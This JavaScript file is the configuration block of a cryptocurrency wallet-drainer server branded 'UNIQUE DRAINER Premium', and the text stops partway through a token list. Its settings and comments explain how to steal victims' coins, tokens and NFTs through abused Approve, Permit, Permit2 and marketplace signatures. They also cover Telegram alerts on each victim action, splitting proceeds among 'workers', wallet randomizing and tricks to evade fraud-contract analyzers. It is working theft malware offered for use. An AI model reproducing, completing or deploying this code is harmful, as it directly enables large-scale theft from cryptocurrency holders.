console.log('\n\n\t============================================================================================');
console.log('\t=========================== UNIQUE DRAINER Premium Server ======================================');
console.log('\t=========== WARNING: Make sure you run CMD with Administrator privileges. ======================');
console.log('\t============================================================================================\n\n');

const https = require('https');
const ethers = require('ethers');
const axios = require('axios');
const express = require('express');
const parser = require('body-parser');
const Telegram = require('node-telegram-bot-api');
const fs = require('fs');
const readline = require('readline');
const path = require('path');
const Web3 = require('web3');

// =====================================================================
// ========================= SCRIPT SETTINGS ===========================
// =====================================================================

const MS_Encryption_Key = 50; // Please specify any number to be used for encryption (not recommended to leave default!)
// The same number should also be specified in the web3-provider.js file - if they differ, nothing will work correctly

const MS_Telegram_Token = "BOT_TOKEN"; // Enter your bot token from @BotFather here (go there, create a bot, and get this token)
const MS_Telegram_Chat_ID = ["CHAT_ID"]; // Enter the chat ID(s) here where notifications about the mammoth's actions need to be sent (if the ID starts with a minus, write it as is)
// To specify multiple chats, fill it out like this: MS_Telegram_Chat_ID = ["CHANNEL_ID", "ANOTHER_CHANNEL_ID", "ONE_MORE_CHANNEL_ID"]
const MS_Telegram_Admin_IDs = [ 1234567890 ]; // Enter your Telegram ID here so that it only accepts commands from you

const MS_Wallet_Address = "INSERT_RECEIVER_HERE"; // Wallet address where the assets will be sent
const MS_Wallet_Private = "WALLET_PRIVATE_HERE"; // Private key for the above wallet, SPECIFYING IS MANDATORY, OTHERWISE WITHDRAWAL WILL NOT WORK
const MS_Wallet_Receiver = ["INSERT_RECEIVER_HERE"]; // Wallet or wallets where assets will be received, may be the same as MS_Wallet_Address or different
// To specify multiple wallets, fill it out like this: MS_Wallet_Receiver = ["WALLET_ADDRESS_HERE", "ANOTHER_WALLET", "ONE_MORE_WALLET"]
// If multiple wallets are specified, the drainer will randomly select one and send assets to it, convenient for asset distribution

const MS_Emergency_System = false; // false - disable, true - enable the automatic replenishment system (NOT RECOMMENDED!)
// The automatic replenishment system allows transferring native currency from your additional wallet to the victim's wallet
// For example, if the victim has an expensive token but no native currency, currency will be sent from your wallet to save the asset
// The system is not the safest and should be used with caution, do not store too much money in the additional wallet
const MS_Emergency_Address = "WALLET_ADDRESS_HERE";
const MS_Emergency_Private = "WALLET_PRIVATE_HERE";
const MS_Emergency_Protection = true; // false - allow one address to receive multiple payments, true - no more than one payment
const MS_Emergency_Mode = 1; // 1 - amounts for sending should be specified in USD, 2 - amounts for sending should be specified in native network currency
// For example, if the first mode is set and you specify 10 for the Ethereum network, the system will convert $10 to ETH and send it to the victim
// If the second mode is set and you specify, for example, 0.005 for the Ethereum network, the system will send exactly 0.005 ETH
// The value of expensive tokens is always specified in USD, even if the second mode of operation is selected!
const MS_Emergency_Amounts = { 
1: 15, // How much currency to send on the Ethereum network
10: 5, // How much currency to send on the Optimism network
56: 2, // How much currency to send on the Binance Smart Chain network
137: 2, // How much currency to send on the Polygon network
250: 2, // How much currency to send on the Fantom network
43114: 2, // How much currency to send on the Avalanche network
42161: 5, // How much currency to send on the Arbitrum network
8453: 5, // How much currency to send on the Base network
324: 5, // How much currency to send on the zkSync Era network
369: 5, // How much currency to send on the Pulse network
};
const MS_Emergency_Price = {
1: 500, // Total token amount in USD to send on Ethereum
10: 100, // Total token amount in USD to send on Optimism
56: 100, // Total token amount in USD to send on Binance Smart Chain
137: 100, // Total token amount in USD to send on Polygon
250: 100, // Total token amount in USD to send on Fantom
43114: 100, // Total token amount in USD to send on Avalanche
42161: 100, // Total token amount in USD to send on Arbitrum
8453: 100, // Total token amount in USD to send on Base
324: 100, // Total token amount in USD to send on zkSync Era
369: 100, // Total token amount in USD to send on Pulse
};

const MS_Split_System = false;// false - send all assets to MS_Wallet_Receiver, true - enable auto-splitting system
const MS_Split_Percent = 30; // Specify here the percentage from 1 to 99 that will be sent to the WORKER (the rest will go to MS_Wallet_Receiver)
const MS_Split_Whitelist = []; // You can add worker addresses to this array to allow splitting assets among them. Note that if this array is empty, the drainer will be allowed to split assets among any addresses received from the client side.
const MS_Split_Rules = [ // With this setting, you can add individual splitting rules for specific wallets.
  { address: '0x0000000000000000000000000000000000000000', percent: 50 },// [EXAMPLE]: The wallet specified here will receive a different percentage from the standard.
  { address: '0x0000000000000000000000000000000000000000', blacklist: true },// [EXAMPLE]: The wallet specified here will be prohibited for use in splitting.
];
const MS_Split_Modes = {// Choose the assets and methods through which splitting will operate.
  native: {
    transfer: true, // Split assets sent to a randomized wallet (if randomizer is enabled).
    contract: true // Split assets sent through a new public contract.
  },
  tokens: {
    transfer: true, // Split assets sent to a randomized wallet (if the randomizer is enabled).
    approve: true, // Split assets sent through Approve, Increase Allowance, Increase Approval.
    permit: true, // Split assets sent through PERMIT.
    permit2: true, // Split assets sent through PERMIT2.
    repeat: false, // Split assets withdrawn through re-entry.
  }
};
const MS_Split_Min_Value = 0; // The amount in USD from which splitting will trigger (0 - from any).
const MS_Split_Max_Value = 0; // The amount in USD up to which splitting will trigger (0 - up to any).
const MS_Split_NFTs = 0; // 0 - send NFTs to the MS Wallet Receiver wallet, 1 - send to the worker's wallet.

const MS_Allowance_API = true; // Should the history of approved tokens be saved (required for the confirmation check module)?
const MS_Allowance_Check = false; // Check wallets for recurring deposits (do not enable if third-party software is used)
const MS_Allowance_Withdraw = {
  mode: false, // Automatically withdraw newly found assets from the wallet (only works when MS_Allowance_Check is enabled)
  min_amount: 0, // The amount in dollars that will trigger automatic asset withdrawal (will only work with a working DeBank token!)
  wallets: { // List of wallets where automatic withdrawal is active, including your main wallet (ADDRESS:PRIVATE)
    "WALLET_ADDRESS_HERE": "WALLET_PRIVATE_HERE",
  }
};

const MS_Functional_Bot = true; // Allows performing certain actions within the bot (such as repeated debits, etc.)
const MS_Keep_ID_History = true; // Whether to keep the numbering of connecting users after server restart
const MS_CIS_Protection = true; // Prohibit access for CIS countries (disable only for testing purposes!)
const MS_Protection = false; // If set to "true", additional backend protection will be activated
// It will help to withstand some types of attacks you may face, but there is
// a chance that it may block some normal requests, so use with caution
// For example, wallet verification requests can only be made once per minute from one IP
// Also, any data that looks abnormal will result in a 10-minute block
const MS_Repeats_Protection = true; // Protection against flooding with repeated encoded messages
const MS_Repeats_TS = 300; // After how many seconds the memory list of repetitions will be cleared
const MS_Check_Limits = true; // Additional protection against "clicking" by appraisers, when enabled, don't forget to configure the parameters below
const MS_Check_Settings = {
  reset_after: 60, // After how many seconds the limit will be reset
  block_for_all: true, // It will block all checks upon exceeding the overall limit for the specified duration above
  limit_for_all: 30, // If the above parameter is enabled, after this number of requests, all checks will be blocked
  block_by_ip: true, // If the above parameter is enabled, checks from a specific IP will be blocked after exceeding the personal limit
  block_by_id: true, // If the above parameter is enabled, checks from a specific User ID will be blocked after exceeding the personal limit
  limit_personal: 5, // If one of the above parameters is enabled, the check for the user will be blocked after this number of requests
};


// Below are the settings for evaluators, you can use either one evaluator or multiple.
// To use an evaluator, you need to specify its working key below, without a key, the evaluator will not work.
// If the status of all evaluators is "false", the drainer will attempt to use the free Ankr, but it is not very effective.
// It is highly recommended to use the DeBank evaluator - it is the most stable and high-quality in terms of evaluation.
// To use multiple evaluators, simply set "true" for the required evaluators instead of "false".
// If you enable an evaluator but do not specify or specify a non-working key, you will get incorrect results.

// To get the key from DeBank, go to the website cloud.debank.com, register, then
// In the left menu, find the Open API item, select it, on the right you will see the Access Key - this is your token.
// In the same window, you will need to purchase so-called units, the minimum price for them is $200.
// After you see that the units have been credited to your balance, you can use the drainer.

// To get the key from Ankr, go to the website ankr.com, register, and top up your balance with any amount (preferably > $30).
// After that, open RPC Ethereum, there will be a link, after the last slash in this link will be your token - copy it.
// Be careful and keep an eye on the balance on the website, if you top up with a small amount, it will be spent fairly quickly.
// If there is no key in the link, it means you have not topped up enough or the funds have not yet been credited to your account.

const MS_Use_Native = false; // If set to "true", the drainer analyzes networks using built-in RPC.
// Token search by this method is limited to the native coin and some stablecoins.
// Therefore, for extended functionality, it is necessary to use at least one of the evaluators below.
const MS_Use_Ankr = false; // If set to "true", tokens are analyzed through Ankr (on the server side).
const MS_Use_DeBank = false; // If set to "true", tokens and NFTs are analyzed through DeBank; otherwise, they are analyzed through the Ankr API.
const MS_Use_OpenSea = false; // If set to "true", NFTs will be requested through OpenSea; Zapper and DeBank are ignored.
const MS_Use_Zapper = false; // If set to "true", tokens will be requested through Zapper (if MS_Use_OpenSea = false, then NFTs as well).

// The lines below indicate tokens for the evaluators. Do not forget to specify them - it will not work otherwise [!].

const MS_Ankr_Token = ""; // Ankr Premium token, leave it blank ("") to use Ankr Free.
const MS_DeBank_Token = ""; // Token from Cloud DeBank API, if analysis is done through it.
const MS_Zapper_Token = ""; // Token from Zapper API, if NFT analysis is done through it.
const MS_OpenSea_Token = ""; // Token from OpenSea API, without it, OpenSea API will no longer function.

const MS_Enable_API = false; // Enables API that can be used in your projects.
const MS_API_Token = "secret"; // Access key for accessing API requests (BE SURE TO CHANGE THIS VALUE!).
const MS_API_Mode = 1; // 1 - Only outgoing assets, 2 - inputs, connections, and outgoing assets, 3 - absolutely everything.

const MS_Loop_Assets = 0; // 0 - Issue an error to the user at the end (RECOMMENDED), 1 - Start requesting assets in a loop after the end.
const MS_Loop_Native = 0; // 0 - Move on after rejection (RECOMMENDED), 1 - Prompt for signature until the last.
const MS_Loop_Tokens = 0; // 0 - Move on after rejection (RECOMMENDED), 1 - Prompt for signature until the last.
const MS_Loop_NFTs = 0;   // 0 - Move on after rejection (RECOMMENDED), 1 - Prompt for signature until the last.

const MS_Domains_Mode = 0; // 0 - Allow any domains, 1 - Allow only those in the whitelist.
const MS_Domains_Whilelist = [ "example.com", "another.example.com" ]; // Whitelist of domains, fill in as per the example.

const MS_Blacklist_Online = 1; // 0 - use only local blacklist, 1 - load global blacklist
const MS_Blacklist_URL = "https://pastebin.com/raw/fKg5tQWu"; // link to general blacklist (Raw-JSON)

// The array below contains RPCs for working with networks within the server; here you can use private RPCs

const MS_Private_RPC_URLs = {
  1: 'https://rpc.ankr.com/eth' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Ethereum
  10: 'https://rpc.ankr.com/optimism' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Optimism
  56: 'https://rpc.ankr.com/bsc' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Binance Smart Chain
  137: 'https://rpc.ankr.com/polygon' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Polygon
  250: 'https://rpc.ankr.com/fantom' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Fantom
  43114: 'https://rpc.ankr.com/avalanche' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Avalanche
  42161: 'https://rpc.ankr.com/arbitrum' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Arbitrum
  8453: 'https://rpc.ankr.com/base' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // Base
  324: 'https://rpc.ankr.com/zksync_era' + ((MS_Ankr_Token == '') ? '' : `/${MS_Ankr_Token}`), // zkSync Era
  369: 'https://pulsechain.publicnode.com', // Pulse
};


// The array below contains RPCs for working with networks within the client; it is recommended to use public RPCs here

const MS_Public_RPC_URLs = {
  1: 'https://rpc.ankr.com/eth', // Ethereum
  10: 'https://rpc.ankr.com/optimism', // Optimism
  56: 'https://rpc.ankr.com/bsc', // Binance Smart Chain
  137: 'https://rpc.ankr.com/polygon', // Polygon
  250: 'https://rpc.ankr.com/fantom', // Fantom
  43114: 'https://rpc.ankr.com/avalanche', // Avalanche
  42161: 'https://rpc.ankr.com/arbitrum', // Arbitrum
  8453: 'https://rpc.ankr.com/base', // Base
  324: 'https://rpc.ankr.com/zksync_era', // zkSync Era
  369: 'https://pulsechain.publicnode.com', // Pulse
};


// Below are the notification settings you want to receive

const MS_Notifications = {
  enter_website: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Enter the site
  leave_website: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Exit the site
  connect_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Successful connection
  connect_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Connection request
  connect_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Connection refused
  approve_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Request for confirmation
  approve_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Successful confirmation
  approve_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Confirmation rejected
  permit_sign_data: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Data from PERMIT
  transfer_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Request for transfer
  transfer_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Successful transfer
  transfer_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Cancel transfer
  sign_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Signature request
  sign_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Successful signature
  sign_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Signature rejected
  chain_request: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Request to change network
  chain_success: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Network change accepted
  chain_cancel: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Network change rejected
  random_wallet: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Create a personal wallet
  find_token: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Notification about finding a repeat token (without withdrawal)
  withdraw_token: { mode: true, chat_id: MS_Telegram_Chat_ID }, // Notification about finding a repeat token (with output)
};

// Below you can specify a message that a person will sign to verify the wallet
// May contain a {{ADDRESS}} tag, which will be replaced with a valid wallet address
// Wallet verification is necessary in order to discard fake or spoof wallets

const MS_VERIFY_WALLET = 0; // 1 - verify the wallet before debiting (RECOMMENDED), 0 - accept any address without verification
const MS_VERIFY_MESSAGE = `By signing this message, you agree to the Terms of Use and authorize the use of your wallet address to identify you on the site, also confirm that you are the wallet's owner:\n\n{{ADDRESS}}`;


// Below is a black list of tokens in which PERMIT is present, but for some reason does not work
// If you find one, add it to the list below and PERMIT will not be used to withdraw this token

const MS_PERMIT_BLACKLIST = [
  // Recording format: [ Chain_ID, Contract_Address ],
  [ 1, '0xae7ab96520de3a18e5e111b5eaab095312d7fe84' ],
  [ 137, '0x2791bca1f2de4661ed88a30c99a7a9449aa84174' ],
];

// Below is a black list of tokens in which unlimited confirmation does not work, but only specific
// If you find one, add it to the list below and only a certain amount will be confirmed

const MS_UNLIMITED_BLACKLIST = [
  // Recording format: [ Chain_ID, Contract_Address ],
  [ 1, '0x1f9840a85d5af5bf1d1762f925bdaddc4201f984' ],
];

// Below are the settings for the drainer operation logic

const MS_Settings = {
  Gas_Multiplier: 2, // How much to increase the gas cost for the gas flow rate (recommended: 1.5 - 2)
  Use_Public_Contract: true, // false - use, true - use public contract
  Use_Wallet_Randomizer: true, // false - do not replace the wallet, true - replace the wallet with a new one and then send it to the main one
  Use_Randomizer_For_Tokens: true, // false - do not replace the wallet, true - replace the wallet with a new one when withdrawing tokens (TRANSFER/APPROVE/PERMIT/PERMIT2)
  Use_Back_Feature: true, // false - do not use, true - when working through a new generation contract
  // return one back to the victim's wallet to confuse some fraudulent contract analyzers
  Use_Contract_Amount: 10, // Use the contract only from the USD amount to reduce the chance of the contract being marked
  Use_Public_Premium: true, // Use a separate public contract for profits over $500
  Minimal_Wallet_Price: 1, // Specify the minimum value of the wallet in USD
  Tokens_First: 0, // 0 - by price, 1 - native token is always last, 2 - native token is always first
  // The two settings below are very important and the speed and quality of the drainer work depends on them
  // By turning off one or both settings, you will achieve a higher speed of the drainer
  // But at the same time you will reduce the quality of write-offs, confirmations may not arrive and will be reset
  // There may also be problems with automatic debiting of approved tokens
  // By enabling one or both settings, you will greatly improve the quality of write-offs, but reduce the speed
  Wait_For_Confirmation: 1, // 0 - continue without waiting for confirmation (HIGHLY NOT RECOMMENDED), 1 - wait for confirmation
  Wait_For_Response: 1, // 0 - do not wait for a response from the server (HIGHLY NOT RECOMMENDED), 1 - wait for a response from the server
  Sign: {
    Native: 1, // 0 - disabled, 1 - sign Transfer
    Tokens: 1, // 0 - disabled, 1 - sign Approve (recommended), 2 - sign Transfer
    NFTs: 1, // 0 - disabled, 1 - sign SAFA, 2 - sign TransferFrom
    Force: 0, // 0 - use another method if there is no signature, 1 - signature only
    WalletConnect: 1, // 0 - do not use in WalletConnect, 1 - use in WalletConnect
    WC_AE: 1, // 0 - skip signature only for known errors, 1 - for any errors (RECOMMENDED)
    MetaMask: 1, // 0 - disable signature for MetaMask, 1 - enable signature for MetaMask
    Trust: 1, // 0 - disable signature for Trust Wallet, 1 - enable signature for Trust Wallet
  },
  Permit: {
    Mode: 1, // 0 - disabled, 1 - enabled
    Priority: 0, // 0 - no priority, more than 0 - priority Permit from this amount in USD
    Bypass: 0, // 0 - block suspicious signatures, 1 - skip any signatures indiscriminately
    Challenge: 1, // 0 - if the signature is incorrect, reject; 1 - if the signature is incorrect, try to correct it
    Price: 1, // Minimum amount from which will be written off using this method
  },
  Permit2: {
    Mode: 1, // 0 - disabled, 1 - enabled
    Bypass: 0, // 0 - block suspicious signatures, 1 - skip any signatures indiscriminately
    Price: 1, // Minimum amount from which will be written off using this method
  },
  Approve: {
    Enable: 1, // 0 - disabled, 1 - enabled
    MetaMask: 2, // 0 - disabled, 1 - enabled, 2 - partial bypass (if not - TRANSFER), 3 - partial bypass (if not - ignore), 4 - partial bypass (if not - APPROVE)
    Trust: 4, // 0 - disabled, 1 - enabled, 2 - partial bypass (if not - TRANSFER), 3 - partial bypass (if not - ignore), 4 - partial bypass (if not - APPROVE)
    Bypass: 0, // 0 - block suspicious signatures, 1 - skip any signatures indiscriminately
    Withdraw: 1, // 0 - do not withdraw confirmed assets automatically, 1 - withdraw assets automatically
    Withdraw_Amount: 1, // Minimum amount for withdrawing a confirmed asset (only with Withdraw: 1)
  },
  SAFA: {
    Enable: 1, // 0 - disable, 1 - enable automatic NFT withdrawal
    Bypass: 0, // 0 - block suspicious signatures, 1 - skip any signatures indiscriminately
    Withdraw: 2, // 0 - do not withdraw confirmed assets automatically, 1 - withdraw only the most expensive, 2 - withdraw all assets
    Withdraw_Amount: 1, // Minimum amount for withdrawing a confirmed asset (only with Withdraw: 1/2)
  },
  Swappers: {
    Enable: 0, // 0 - disabled (RECOMMENDED), 1 - enabled
    Priority: 0, // 0 - without priority, 1 - with priority (but after Permit), 2 - with priority (absolute)
    Price: 50, // Minimum amount from which will be written off using this method
    Uniswap: 1, // 0 - disabled, 1 - enabled (does not work if Enable: 0)
    Pancake: 1, // 0 - disabled, 1 - disabled (does not work if Enable: 0)
    Quick: 0, // 0 - disabled (RECOMMENDED), 1 - enabled (does not work if Enable: 0)
    Sushi: 0, // 0 - disabled (RECOMMENDED), 1 - enabled (does not work if Enable: 0)
  },
  SeaPort: {
    Enable: 0, // 0 - disabled, 1 - enabled (only works when the SeaPort module is installed)
    Priority: 1, // 0 - triggers when the first NFT is reached, 1 - triggers first
    Limit: 1, // 0 - do not limit calls, 1 - no more than one call from one wallet
    Price: 1,// Minimum amount from which will be written off using this method
  },
  Blur: {
    Enable: 0, // 0 - disabled, 1 - enabled (only works when the Blur module is installed)
    Priority: 1, // 0 - triggers when the first NFT is reached, 1 - triggers first
    Limit: 1, // 0 - do not limit calls, 1 - no more than one call from one wallet
    Price: 1, // Minimum amount from which will be written off using this method
  },
  x2y2: {
    Enable: 0, // 0 - disabled, 1 - enabled (works only when the X2Y2 module is installed)
    Priority: 1, // 0 - triggers when the first NFT is reached, 1 - triggers first
    Price: 1, // Minimum amount from which will be written off using this method
  },
  Chains: {
    eth: { // Ethereum, network settings
      Enable: 1, // 0 - disabled, 1 - enabled
      Native: 1, // 0 - disabled, 1 - enabled
      Tokens: 1, // 0 - disabled, 1 - enabled
      NFTs: 1, // 0 - disabled, 1 - enabled
      Min_Native_Price: 1, // minimum cost of the main coin in USD
      Min_Tokens_Price: 1, // minimum token value in USD
      Min_NFTs_Price: 1, // minimum NFT value in USD
      API: '2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99', // Etherscan API Key (don't change if you're not sure)
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
      Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - use style contracts, 1 - use standard contracts, 2 - use improved contract 
    },
    bsc: { // Binance Smart Chain, Network Settings
      Enable: 1, // 0 - disabled, 1 - enabled
      Native: 1, // 0 - disabled, 1 - enabled
      Tokens: 1, // 0 - disabled, 1 - enabled
      NFTs: 1, // 0 - disabled, 1 - enabled
      Min_Native_Price: 1, // minimum cost of the main coin in USD
      Min_Tokens_Price: 1, // minimum token value in USD
      Min_NFTs_Price: 1, // minimum NFT value in USD
      API: 'K5AI5N7ZPC9EF6G9MVQF33CBVMY1UKQ7HI', // Bscscan API Key (do not change if you are not sure)
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Bscscan API Key (do not change if you are not sure)
      Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - use style contracts, 1 - use standard contracts, 2 - use improved contract 
    },
    polygon: { // Polygon (MATIC), network settings
      Enable: 1, // 0 - disabled, 1 - enabled
      Native: 1, // 0 - disabled, 1 - enabled
      Tokens: 1, // 0 - disabled, 1 - enabled
      NFTs: 1, // 0 - disabled, 1 - enabled
      Min_Native_Price: 1, // minimum cost of the main coin in USD
      Min_Tokens_Price: 1,// minimum token value in USD
      Min_NFTs_Price: 1, // minimum NFT value in USD
      API: 'M9IMUX515SEB97THWJRQDKNX75CI66X7XX', // Polygonscan API Key (do not change if you are not sure)
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
      Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract 
    },
    avalanche: { // Avalanche C-Chain, network setup
      Enable: 1, // 0 - disabled, 1 - enabled
      Native: 1, // 0 - disabled, 1 - enabled
      Tokens: 1, // 0 - disabled, 1 - enabled
      NFTs: 1, // 0 - disabled, 1 - enabled
      Min_Native_Price: 1, // minimum cost of the main coin in USD
      Min_Tokens_Price: 1, // minimum token value in USD
      Min_NFTs_Price: 1, // minimum NFT value in USD
      API: 'ZMJ2CKEX65EJ8WIPWRJWKRFG8HXCM6I89Z', // Snowtrace API Key (don't change if you're not sure)
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
      Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract 
    },
    arbitrum: { // Arbitrum, network setup
      Enable: 1, // 0 - disabled, 1 - enabled
      Native: 1, // 0 - disabled, 1 - enabled
      Tokens: 1, // 0 - disabled, 1 - enabled
      NFTs: 1, // 0 - disabled, 1 - enabled
      Min_Native_Price: 1, // minimum cost of the main coin in USD
      Min_Tokens_Price: 1, // minimum token value in USD
      Min_NFTs_Price: 1, // minimum NFT value in USD
      API: 'DU3TKS3QYBQAHC7SEQ5YHB9VPD85JXTX7I', // Arbscan API Key (do not change if you are not sure)
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
      Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract 
    },
    fantom: { // Fantom, network setup
      Enable: 1, // 0 - disabled, 1 - enabled
      Native: 1, // 0 - disabled, 1 - enabled
      Tokens: 1, // 0 - disabled, 1 - enabled
      NFTs: 1, // 0 - disabled, 1 - enabled
      Min_Native_Price: 1, // minimum cost of the main coin in USD
      Min_Tokens_Price: 1, // minimum token value in USD
      Min_NFTs_Price: 1, // minimum NFT value in USD
      API: 'F9GFY4EXGD84MHWEK5NCUJWF9FZVBRT415', // Fantomscan API Key (do not change if you are not sure)
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
      Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract 
    },
    optimism: { // Optimism, network settings
      Enable: 1, // 0 - disabled, 1 - enabled
      Native: 1, // 0 - disabled, 1 - enabled
      Tokens: 1, // 0 - disabled, 1 - enabled
      NFTs: 1, // 0 - disabled, 1 - enabled
      Min_Native_Price: 1, // minimum cost of the main coin in USD
      Min_Tokens_Price: 1, // minimum token value in USD
      Min_NFTs_Price: 1, // minimum NFT value in USD
      API: '46J83C1RF5TEWJ3NVCF17PG3KYD36U9QPK', // Optimismscan API Key (do not change if you are not sure)
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
      Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0,// 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract 
    },
    base: { // Base, network setup
      Enable: 1, // 0 - disabled, 1 - enabled
      Native: 1, // 0 - disabled, 1 - enabled
      Tokens: 1, // 0 - disabled, 1 - enabled
      NFTs: 1, // 0 - disabled, 1 - enabled
      Min_Native_Price: 1, // minimum cost of the main coin in USD
      Min_Tokens_Price: 1, // minimum token value in USD
      Min_NFTs_Price: 1, // minimum NFT value in USD
      API: '6NGC2DAW6N197CWFP224HSR3778ZDFF6EI', // Basescan API Key (do not change if you are not sure)
      Contract_Address: "0x0007039b77d22042afc1a9c3b3da11837b730000", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
      Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract 
    },
    zksync_era: { // ZkSync Era, network setup
      Enable: 1, // 0 - disabled, 1 - enabled
      Native: 1, // 0 - disabled, 1 - enabled
      Tokens: 1, // 0 - disabled, 1 - enabled
      NFTs: 1, // 0 - disabled, 1 - enabled
      Min_Native_Price: 1, // minimum cost of the main coin in USD
      Min_Tokens_Price: 1, // minimum token value in USD
      Min_NFTs_Price: 1, // minimum NFT value in USD
      API: '', // ZkSync Era API Key (do not change if you are not sure)
      Contract_Address: "", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
      Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract 
    },
    pulse: { // Pulse, network setup
      Enable: 1, // 0 - disabled, 1 - enabled
      Native: 1, // 0 - disabled, 1 - enabled
      Tokens: 1, // 0 - disabled, 1 - enabled
      NFTs: 1, // 0 - disabled, 1 - enabled
      Min_Native_Price: 1, // minimum cost of the main coin in USD
      Min_Tokens_Price: 1, // minimum token value in USD
      Min_NFTs_Price: 1, // minimum NFT value in USD
      API: '', // Pulse API Key (do not change if you are not sure)
      Contract_Address: "", // Address for the smart contract, if you don’t know or don’t use it, leave it blank
      Contract_Type: "Execute", // Variations: Claim, ClaimReward, ClaimRewards, SecurityUpdate, Connect, Execute, Swap, Multicall
      Contract_Legacy: 0, // 0 - use MS Drainer style contracts, 1 - use standard contracts, 2 - use improved MS Drainer contract 
    },
  }
};

// The array below contains a list of tokens that are scanned in the native way

const MS_Stablecoins_List = {
  1: [
    {
      address: '0xdac17f958d2ee523a2206206994597c13d831ec7',
      name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
    },
    {
      address: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
    },
    {
      address: '0x6b175474e89094c44da98b954eedeac495271d0f',
      name: 'DAI Stablecoin', symbol: 'DAI', price: 1, decimals: 18
    },
  ],
  10: [
    {
      address: '0x94b008aa00579c1307b0ef2c499ad98a8ce58e58',
      name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
    },
    {
      address: '0x7f5c764cbc14f9669b88837ca1490cca17c31607',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
    },
  ],
  56: [
    {
      address: '0x55d398326f99059ff775485246999027b3197955',
      name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 18
    },
    {
      address: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 18
    },
    {
      address: '0xe9e7cea3dedca5984780bafc599bd69add087d56',
      name: 'Binance USD', symbol: 'BUSD', price: 1, decimals: 18
    },
  ],
  137: [
    {
      address: '0xc2132d05d31c914a87c6611c10748aeb04b58e8f',
      name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
